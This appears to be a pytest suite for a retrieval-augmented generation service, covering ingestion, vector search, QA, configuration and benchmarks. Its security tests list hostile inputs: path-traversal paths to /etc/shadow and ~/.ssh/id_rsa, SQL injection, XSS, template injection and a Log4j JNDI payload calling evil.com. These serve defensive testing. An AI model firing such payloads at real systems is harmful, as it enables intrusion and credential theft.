import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from pathlib import Path
import tempfile
import json
from typing import List, Dict, Any
import numpy as np

# Assuming these are your RAG service classes
# You'll need to adjust imports based on your actual structure
from rag_service.document_processor import DocumentProcessor
from rag_service.vector_store import VectorStore
from rag_service.retriever import Retriever
from rag_service.qa_service import QAService
from rag_service.rag_pipeline import RAGPipeline
from rag_service.exceptions import DocumentProcessingError, RetrievalError, QAError


class TestDocumentProcessor:
    """Tests for document ingestion and processing"""
    
    @pytest.fixture
    def document_processor(self):
        return DocumentProcessor()
    
    @pytest.fixture
    def sample_text_file(self):
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("This is a sample document for testing RAG ingestion.")
            return f.name
    
    @pytest.fixture
    def sample_pdf_content(self):
        return "Sample PDF content for RAG testing with multiple paragraphs."
    
    def test_process_text_file(self, document_processor, sample_text_file):
        """Test basic text file processing"""
        result = document_processor.process_file(sample_text_file)
        
        assert result is not None
        assert isinstance(result, dict)
        assert 'content' in result
        assert 'metadata' in result
        assert len(result['content']) > 0
    
    def test_process_empty_file(self, document_processor):
        """Test handling of empty files"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("")
            empty_file = f.name
        
        with pytest.raises(DocumentProcessingError):
            document_processor.process_file(empty_file)
    
    def test_process_unsupported_file_type(self, document_processor):
        """Test handling of unsupported file types"""
        with tempfile.NamedTemporaryFile(suffix='.xyz', delete=False) as f:
            unsupported_file = f.name
        
        with pytest.raises(DocumentProcessingError):
            document_processor.process_file(unsupported_file)
    
    def test_chunk_text(self, document_processor):
        """Test text chunking functionality"""
        long_text = "This is a long document. " * 100
        chunks = document_processor.chunk_text(long_text, chunk_size=100, overlap=20)

        # Check that the last chunk contains the last part of the text
        last_chunk = chunks[-1]
        assert "long document." in last_chunk
        # If chunk_size=100 and overlap=20, and len(long_text) > 100, last chunk should not be empty
        assert len(last_chunk) > 0
        
        assert len(chunks) > 1
        assert all(len(chunk) <= 120 for chunk in chunks)  # chunk_size + overlap
        assert isinstance(chunks, list)
    
    def test_extract_metadata(self, document_processor, sample_text_file):
        """Test metadata extraction"""
        metadata = document_processor.extract_metadata(sample_text_file)
        
        assert isinstance(metadata, dict)
        assert 'filename' in metadata
        assert 'file_size' in metadata
        assert 'file_type' in metadata
        assert 'created_at' in metadata
    
    @patch('rag_service.document_processor.PyPDFLoader')
    def test_process_pdf_file(self, mock_pdf_loader, document_processor):
        """Test PDF file processing"""
        mock_loader_instance = Mock()
        mock_loader_instance.load.return_value = [
            Mock(page_content="Page 1 content", metadata={"page": 1}),
            Mock(page_content="Page 2 content", metadata={"page": 2})
        ]
        mock_pdf_loader.return_value = mock_loader_instance
        
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
            pdf_file = f.name
        
        result = document_processor.process_file(pdf_file)
        
        assert result is not None
        assert 'content' in result
        mock_pdf_loader.assert_called_once_with(pdf_file)


class TestVectorStore:
    """Tests for vector storage and retrieval"""
    
    @pytest.fixture
    def vector_store(self, request):
        vs = VectorStore(dimension=384)  # Assuming 384-dim embeddings
        
        # Add finalizer to clean up after the test
        request.addfinalizer(vs.cleanup)
        
        return vs
    
    @pytest.fixture
    def sample_embeddings(self):
        return np.random.rand(5, 384).astype(np.float32)
    
    @pytest.fixture
    def sample_documents(self):
        return [
            {"id": "doc1", "content": "First document content", "metadata": {"source": "file1.txt"}},
            {"id": "doc2", "content": "Second document content", "metadata": {"source": "file2.txt"}},
            {"id": "doc3", "content": "Third document content", "metadata": {"source": "file3.txt"}},
            {"id": "doc4", "content": "Fourth document content", "metadata": {"source": "file4.txt"}},
            {"id": "doc5", "content": "Fifth document content", "metadata": {"source": "file5.txt"}}
        ]
    
    def test_add_documents(self, vector_store, sample_documents, sample_embeddings):
        """Test adding documents to vector store"""
        vector_store.add_documents(sample_documents, sample_embeddings)
        
        assert vector_store.count() == 5
        assert vector_store.get_document("doc1") is not None
    
    def test_similarity_search(self, vector_store, sample_documents, sample_embeddings):
        """Test similarity search functionality"""
        vector_store.add_documents(sample_documents, sample_embeddings)
        
        query_embedding = np.random.rand(384).astype(np.float32)
        results = vector_store.similarity_search(query_embedding, k=3)
        
        assert len(results) == 3
        assert all('score' in result for result in results)
        assert all('document' in result for result in results)
    
    def test_empty_vector_store_search(self, vector_store):
        """Test search on empty vector store"""
        query_embedding = np.random.rand(384).astype(np.float32)
        results = vector_store.similarity_search(query_embedding, k=3)
        
        assert len(results) == 0
    
    def test_delete_document(self, vector_store, sample_documents, sample_embeddings):
        """Test document deletion"""
        vector_store.add_documents(sample_documents, sample_embeddings)
        
        vector_store.delete_document("doc1")
        
        assert vector_store.count() == 4
        assert vector_store.get_document("doc1") is None
    
    def test_update_document(self, vector_store, sample_documents, sample_embeddings):
        """Test document update"""
        vector_store.add_documents(sample_documents, sample_embeddings)
        
        updated_doc = {"id": "doc1", "content": "Updated content", "metadata": {"source": "updated.txt"}}
        updated_embedding = np.random.rand(384).astype(np.float32)
        
        vector_store.update_document(updated_doc, updated_embedding)
        
        retrieved_doc = vector_store.get_document("doc1")
        assert retrieved_doc["content"] == "Updated content"


class TestRetriever:
    """Tests for document retrieval component"""
    
    @pytest.fixture
    def mock_vector_store(self):
        mock_store = Mock()
        mock_store.similarity_search.return_value = [
            {"document": {"content": "Relevant content 1", "metadata": {"source": "doc1"}}, "score": 0.9},
            {"document": {"content": "Relevant content 2", "metadata": {"source": "doc2"}}, "score": 0.8},
            {"document": {"content": "Relevant content 3", "metadata": {"source": "doc3"}}, "score": 0.7}
        ]
        return mock_store
    
    @pytest.fixture
    def mock_embedder(self):
        mock_embedder = Mock()
        mock_embedder.embed_query.return_value = np.random.rand(384).astype(np.float32)
        return mock_embedder
    
    @pytest.fixture
    def retriever(self, mock_vector_store, mock_embedder):
        return Retriever(vector_store=mock_vector_store, embedder=mock_embedder)
    
    def test_retrieve_documents(self, retriever, mock_vector_store, mock_embedder):
        """Test basic document retrieval"""
        query = "What is the capital of France?"
        results = retriever.retrieve(query, k=3)
        
        assert len(results) == 3
        assert all('content' in result for result in results)
        mock_embedder.embed_query.assert_called_once_with(query)
        mock_vector_store.similarity_search.assert_called_once()
    
    def test_retrieve_with_threshold(self, retriever, mock_vector_store):
        """Test retrieval with similarity threshold"""
        mock_vector_store.similarity_search.return_value = [
            {"document": {"content": "High relevance", "metadata": {}}, "score": 0.9},
            {"document": {"content": "Medium relevance", "metadata": {}}, "score": 0.7},
            {"document": {"content": "Low relevance", "metadata": {}}, "score": 0.4}
        ]
        
        results = retriever.retrieve("query", k=5, threshold=0.6)
        
        assert len(results) == 2  # Only scores >= 0.6
    
    def test_retrieve_empty_results(self, retriever, mock_vector_store):
        """Test handling of empty retrieval results"""
        mock_vector_store.similarity_search.return_value = []
        
        results = retriever.retrieve("query", k=3)
        
        assert len(results) == 0
    
    def test_retrieve_with_metadata_filter(self, retriever, mock_vector_store):
        """Test retrieval with metadata filtering"""
        results = retriever.retrieve("query", k=3, metadata_filter={"source": "doc1"})
        
        mock_vector_store.similarity_search.assert_called_once()
        # Verify that metadata filter was applied


class TestQAService:
    """Tests for Q&A service component"""
    
    @pytest.fixture
    def mock_llm(self):
        mock_llm = AsyncMock()
        mock_llm.generate.return_value = "This is a generated answer based on the context."
        return mock_llm
    
    @pytest.fixture
    def qa_service(self, mock_llm):
        return QAService(llm=mock_llm)
    
    @pytest.fixture
    def sample_context(self):
        return [
            {"content": "France is a country in Europe.", "metadata": {"source": "doc1"}},
            {"content": "Paris is the capital of France.", "metadata": {"source": "doc2"}},
            {"content": "France has a population of about 67 million.", "metadata": {"source": "doc3"}}
        ]
    
    @pytest.mark.asyncio
    async def test_generate_answer(self, qa_service, mock_llm, sample_context):
        """Test answer generation with context"""
        query = "What is the capital of France?"
        
        answer = await qa_service.generate_answer(query, sample_context)
        
        assert isinstance(answer, str)
        assert len(answer) > 0
        mock_llm.generate.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_generate_answer_no_context(self, qa_service, mock_llm):
        """Test answer generation without context"""
        query = "What is the capital of France?"
        
        answer = await qa_service.generate_answer(query, [])
        
        assert isinstance(answer, str)
        mock_llm.generate.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_generate_answer_with_sources(self, qa_service, mock_llm, sample_context):
        """Test answer generation with source attribution"""
        query = "What is the capital of France?"
        
        result = await qa_service.generate_answer_with_sources(query, sample_context)
        
        assert isinstance(result, dict)
        assert 'answer' in result
        assert 'sources' in result
        assert isinstance(result['sources'], list)
    
    @pytest.mark.asyncio
    async def test_llm_error_handling(self, qa_service, mock_llm, sample_context):
        """Test handling of LLM errors"""
        mock_llm.generate.side_effect = Exception("LLM service unavailable")
        
        with pytest.raises(QAError):
            await qa_service.generate_answer("query", sample_context)
    
    def test_format_context(self, qa_service, sample_context):
        """Test context formatting for LLM"""
        formatted = qa_service.format_context(sample_context)
        
        assert isinstance(formatted, str)
        assert "France is a country in Europe." in formatted
        assert "Paris is the capital of France." in formatted


class TestRAGPipeline:
    """Integration tests for the complete RAG pipeline"""
    
    @pytest.fixture
    def mock_document_processor(self):
        mock_processor = Mock()
        mock_processor.process_file.return_value = {
            "content": "Sample document content",
            "metadata": {"source": "test.txt"}
        }
        mock_processor.chunk_text.return_value = ["Chunk 1", "Chunk 2", "Chunk 3"]
        return mock_processor
    
    @pytest.fixture
    def mock_vector_store(self):
        mock_store = Mock()
        mock_store.add_documents.return_value = None
        mock_store.similarity_search.return_value = [
            {"document": {"content": "Relevant content", "metadata": {"source": "test.txt"}}, "score": 0.9}
        ]
        return mock_store
    
    @pytest.fixture
    def mock_retriever(self):
        mock_retriever = Mock()
        mock_retriever.retrieve.return_value = [
            {"content": "Relevant content", "metadata": {"source": "test.txt"}}
        ]
        return mock_retriever
    
    @pytest.fixture
    def mock_qa_service(self):
        mock_qa = AsyncMock()
        mock_qa.generate_answer_with_sources.return_value = {
            "answer": "Generated answer",
            "sources": ["test.txt"]
        }
        return mock_qa
    
    @pytest.fixture
    def rag_pipeline(self, mock_document_processor, mock_vector_store, mock_retriever, mock_qa_service):
        return RAGPipeline(
            document_processor=mock_document_processor,
            vector_store=mock_vector_store,
            retriever=mock_retriever,
            qa_service=mock_qa_service
        )
    
    def test_ingest_document(self, rag_pipeline, mock_document_processor, mock_vector_store):
        """Test end-to-end document ingestion"""
        file_path = "test_document.txt"
        
        result = rag_pipeline.ingest_document(file_path)
        
        assert result is not None
        mock_document_processor.process_file.assert_called_once_with(file_path)
        mock_vector_store.add_documents.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_query_pipeline(self, rag_pipeline, mock_retriever, mock_qa_service):
        """Test end-to-end query processing"""
        query = "What is the capital of France?"
        
        result = await rag_pipeline.query(query)
        
        assert isinstance(result, dict)
        assert 'answer' in result
        assert 'sources' in result
        mock_retriever.retrieve.assert_called_once_with(query, k=5)
        mock_qa_service.generate_answer_with_sources.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_query_with_custom_parameters(self, rag_pipeline, mock_retriever, mock_qa_service):
        """Test query with custom retrieval parameters"""
        query = "What is the capital of France?"
        
        result = await rag_pipeline.query(query, k=10, threshold=0.8)
        
        mock_retriever.retrieve.assert_called_once_with(query, k=10, threshold=0.8)
    
    def test_ingest_multiple_documents(self, rag_pipeline, mock_document_processor):
        """Test ingesting multiple documents"""
        file_paths = ["doc1.txt", "doc2.txt", "doc3.txt"]
        
        results = rag_pipeline.ingest_documents(file_paths)
        
        assert len(results) == 3
        assert mock_document_processor.process_file.call_count == 3
    
    def test_ingest_document_error_handling(self, rag_pipeline, mock_document_processor):
        """Test error handling during document ingestion"""
        mock_document_processor.process_file.side_effect = DocumentProcessingError("File not found")
        
        with pytest.raises(DocumentProcessingError):
            rag_pipeline.ingest_document("nonexistent.txt")
    
    @pytest.mark.asyncio
    async def test_query_no_results(self, rag_pipeline, mock_retriever, mock_qa_service):
        """Test query when no documents are retrieved"""
        mock_retriever.retrieve.return_value = []
        
        result = await rag_pipeline.query("obscure query")
        
        mock_qa_service.generate_answer_with_sources.assert_called_once_with("obscure query", [])


class TestRAGServiceConfiguration:
    """Tests for RAG service configuration and setup"""
    
    def test_pipeline_initialization(self):
        """Test RAG pipeline initialization with default components"""
        pipeline = RAGPipeline()
        
        assert pipeline.document_processor is not None
        assert pipeline.vector_store is not None
        assert pipeline.retriever is not None
        assert pipeline.qa_service is not None
    
    def test_pipeline_with_custom_config(self):
        """Test RAG pipeline with custom configuration"""
        config = {
            "vector_store": {"dimension": 512, "index_type": "HNSW"},
            "retriever": {"k": 10, "threshold": 0.7},
            "qa_service": {"model": "gpt-4", "temperature": 0.1}
        }
        
        pipeline = RAGPipeline(config=config)
        
        assert pipeline.config == config


class TestRAGServicePerformance:
    """Performance and load tests for RAG service"""
    
    @pytest.mark.asyncio
    async def test_concurrent_queries(self, rag_pipeline):
        """Test handling of concurrent queries"""
        queries = [
            "What is machine learning?",
            "How does neural network work?",
            "What is deep learning?",
            "Explain artificial intelligence",
            "What is natural language processing?"
        ]
        
        tasks = [rag_pipeline.query(query) for query in queries]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        assert len(results) == 5
        assert all(not isinstance(result, Exception) for result in results)
    
    def test_large_document_ingestion(self, rag_pipeline):
        """Test ingestion of large documents"""
        # Create a large mock document
        large_content = "This is a large document. " * 10000
        
        with patch.object(rag_pipeline.document_processor, 'process_file') as mock_process:
            mock_process.return_value = {
                "content": large_content,
                "metadata": {"source": "large_doc.txt", "size": len(large_content)}
            }
            
            result = rag_pipeline.ingest_document("large_doc.txt")
            
            assert result is not None
            mock_process.assert_called_once()


# Pytest configuration and fixtures
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_config():
    """Mock configuration for testing"""
    return {
        "vector_store": {
            "dimension": 384,
            "index_type": "FLAT"
        },
        "retriever": {
            "k": 5,
            "threshold": 0.0
        },
        "qa_service": {
            "model": "gpt-3.5-turbo",
            "temperature": 0.1,
            "max_tokens": 500
        }
    }


# Utility functions for testing
def create_sample_documents(count: int) -> List[Dict[str, Any]]:
    """Create sample documents for testing"""
    documents = []
    for i in range(count):
        documents.append({
            "id": f"doc_{i}",
            "content": f"This is sample document {i} content for testing.",
            "metadata": {
                "source": f"test_doc_{i}.txt",
                "created_at": "2024-01-01",
                "author": "Test Author"
            }
        })
    return documents


def create_sample_embeddings(count: int, dimension: int = 384) -> np.ndarray:
    """Create sample embeddings for testing"""
    return np.random.rand(count, dimension).astype(np.float32)


# Parametrized tests for different file types
@pytest.mark.parametrize("file_extension,expected_processor", [
    (".txt", "TextProcessor"),
    (".pdf", "PDFProcessor"),
    (".docx", "DocxProcessor"),
    (".md", "MarkdownProcessor"),
])
def test_file_type_routing(file_extension, expected_processor):
    """Test that different file types are routed to correct processors"""
    processor = DocumentProcessor()
    
    with tempfile.NamedTemporaryFile(suffix=file_extension, delete=False) as f:
        if file_extension == ".txt":
            f.write(b"Sample text content")
        elif file_extension == ".md":
            f.write(b"# Sample Markdown\nThis is markdown content.")
        file_path = f.name
    
    # Mock the processor type detection method
    with patch.object(processor, 'get_processor_type') as mock_get_processor:
        mock_get_processor.return_value = expected_processor
        
        processor_type = processor.get_processor_type(file_path)
        assert processor_type == expected_processor
        mock_get_processor.assert_called_once_with(file_path)


# Additional edge case tests
class TestRAGServiceEdgeCases:
    """Test edge cases and boundary conditions"""
    
    def test_extremely_long_query(self, rag_pipeline):
        """Test handling of very long queries"""
        long_query = "What is " + "very " * 1000 + "important information?"
        
        with patch.object(rag_pipeline.retriever, 'retrieve') as mock_retrieve:
            mock_retrieve.return_value = []
            
            # Should handle gracefully without crashing
            asyncio.run(rag_pipeline.query(long_query))
            mock_retrieve.assert_called_once()
    
    def test_special_characters_in_query(self, rag_pipeline):
        """Test queries with special characters and unicode"""
        special_queries = [
            "What about émojis and ñ characters?",
            "How about 中文 queries?",
            "Special chars: !@#$%^&*(){}[]|\\:;\"'<>?",
            "Math symbols: ∑∆∇∂∫π∞"
        ]
        
        for query in special_queries:
            with patch.object(rag_pipeline.retriever, 'retrieve') as mock_retrieve:
                mock_retrieve.return_value = []
                result = asyncio.run(rag_pipeline.query(query))
                assert result is not None
    
    def test_duplicate_document_ingestion(self, rag_pipeline, mock_document_processor):
        """Test ingesting the same document multiple times"""
        file_path = "duplicate_test.txt"
        
        # First ingestion
        result1 = rag_pipeline.ingest_document(file_path)
        
        # Second ingestion of same document
        result2 = rag_pipeline.ingest_document(file_path)
        
        assert result1 is not None
        assert result2 is not None
        # Should handle gracefully (update or skip)
    
    def test_malformed_document_content(self, rag_pipeline, mock_document_processor):
        """Test handling of malformed or corrupted document content"""
        mock_document_processor.process_file.return_value = {
            "content": None,  # Malformed content
            "metadata": {"source": "malformed.txt"}
        }
        
        with pytest.raises((DocumentProcessingError, ValueError)):
            rag_pipeline.ingest_document("malformed.txt")


class TestRAGServiceMemoryManagement:
    """Test memory usage and cleanup"""
    
    def test_vector_store_memory_cleanup(self, vector_store):
        """Test that vector store properly cleans up memory"""
        # Add many documents
        large_batch = create_sample_documents(1000)
        large_embeddings = create_sample_embeddings(1000)
        
        vector_store.add_documents(large_batch, large_embeddings)
        initial_count = vector_store.count()
        
        # Clear all documents
        vector_store.clear()
        
        assert vector_store.count() == 0
        assert initial_count == 1000
    
    def test_retrieval_result_limit(self, rag_pipeline, mock_retriever):
        """Test that retrieval respects result limits"""
        # Mock a large number of results
        mock_results = [{"content": f"Result {i}", "metadata": {}} for i in range(100)]
        mock_retriever.retrieve.return_value = mock_results
        
        result = asyncio.run(rag_pipeline.query("test query", k=5))
        
        # Should limit results appropriately
        mock_retriever.retrieve.assert_called_with("test query", k=5)


class TestRAGServiceSecurity:
    """Test security-related aspects"""
    
    def test_path_traversal_protection(self, document_processor):
        """Test protection against path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/.ssh/id_rsa"
        ]
        
        for path in malicious_paths:
            with pytest.raises((DocumentProcessingError, FileNotFoundError, PermissionError)):
                document_processor.process_file(path)
    
    def test_injection_in_queries(self, rag_pipeline):
        """Test handling of potential injection attempts in queries"""
        injection_queries = [
            "'; DROP TABLE documents; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}"  # Log4j style
        ]
        
        for query in injection_queries:
            with patch.object(rag_pipeline.retriever, 'retrieve') as mock_retrieve:
                mock_retrieve.return_value = []
                result = asyncio.run(rag_pipeline.query(query))
                # Should handle safely without executing malicious code
                assert result is not None


class TestRAGServiceMetrics:
    """Test metrics and monitoring capabilities"""
    
    def test_ingestion_metrics(self, rag_pipeline):
        """Test that ingestion metrics are tracked"""
        with patch.object(rag_pipeline, '_track_ingestion_metrics') as mock_metrics:
            rag_pipeline.ingest_document("test.txt")
            mock_metrics.assert_called_once()
    
    def test_query_latency_tracking(self, rag_pipeline):
        """Test that query latency is tracked"""
        with patch.object(rag_pipeline, '_track_query_latency') as mock_latency:
            asyncio.run(rag_pipeline.query("test query"))
            mock_latency.assert_called_once()
    
    def test_retrieval_accuracy_metrics(self, rag_pipeline, mock_retriever):
        """Test retrieval accuracy metrics"""
        mock_retriever.retrieve.return_value = [
            {"content": "Relevant", "metadata": {"relevance_score": 0.9}},
            {"content": "Less relevant", "metadata": {"relevance_score": 0.6}}
        ]
        
        result = asyncio.run(rag_pipeline.query("test"))
        
        # Should track relevance scores
        assert result is not None


# Configuration tests
class TestRAGServiceConfiguration:
    """Extended configuration tests"""
    
    def test_invalid_configuration(self):
        """Test handling of invalid configuration"""
        invalid_configs = [
            {"vector_store": {"dimension": -1}},  # Invalid dimension
            {"retriever": {"k": 0}},  # Invalid k value
            {"qa_service": {"temperature": 2.0}},  # Invalid temperature
        ]
        
        for config in invalid_configs:
            with pytest.raises((ValueError, ConfigurationError)):
                RAGPipeline(config=config)
    
    def test_configuration_validation(self):
        """Test configuration validation"""
        valid_config = {
            "vector_store": {"dimension": 384, "index_type": "HNSW"},
            "retriever": {"k": 5, "threshold": 0.7},
            "qa_service": {"model": "gpt-3.5-turbo", "temperature": 0.1}
        }
        
        pipeline = RAGPipeline(config=valid_config)
        assert pipeline.validate_config() is True
    
    def test_environment_variable_config(self):
        """Test configuration from environment variables"""
        with patch.dict('os.environ', {
            'RAG_VECTOR_DIMENSION': '512',
            'RAG_RETRIEVAL_K': '10',
            'RAG_QA_MODEL': 'gpt-4'
        }):
            pipeline = RAGPipeline.from_environment()
            assert pipeline.config['vector_store']['dimension'] == 512
            assert pipeline.config['retriever']['k'] == 10
            assert pipeline.config['qa_service']['model'] == 'gpt-4'


# Performance benchmarks
class TestRAGServiceBenchmarks:
    """Performance benchmark tests"""
    
    @pytest.mark.benchmark
    def test_ingestion_throughput(self, rag_pipeline, benchmark):
        """Benchmark document ingestion throughput"""
        def ingest_batch():
            docs = ["test_doc_{}.txt".format(i) for i in range(10)]
            return rag_pipeline.ingest_documents(docs)
        
        result = benchmark(ingest_batch)
        assert result is not None
    
    @pytest.mark.benchmark
    @pytest.mark.asyncio
    async def test_query_latency(self, rag_pipeline, benchmark):
        """Benchmark query response latency"""
        async def query_batch():
            queries = ["What is AI?", "How does ML work?", "Explain NLP"]
            tasks = [rag_pipeline.query(q) for q in queries]
            return await asyncio.gather(*tasks)
        
        result = await benchmark(query_batch)
        assert len(result) == 3
    
    @pytest.mark.benchmark
    def test_vector_search_performance(self, vector_store, benchmark):
        """Benchmark vector similarity search"""
        # Setup large vector store
        docs = create_sample_documents(10000)
        embeddings = create_sample_embeddings(10000)
        vector_store.add_documents(docs, embeddings)
        
        def search_benchmark():
            query_embedding = create_sample_embeddings(1)[0]
            return vector_store.similarity_search(query_embedding, k=10)
        
        result = benchmark(search_benchmark)
        assert len(result) <= 10


# Cleanup and teardown
@pytest.fixture(autouse=True)
def cleanup_temp_files():
    """Automatically cleanup temporary files after each test"""
    temp_files = []
    
    yield temp_files
    
    # Cleanup
    for file_path in temp_files:
        try:
            Path(file_path).unlink(missing_ok=True)
        except Exception:
            pass  # Ignore cleanup errors


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
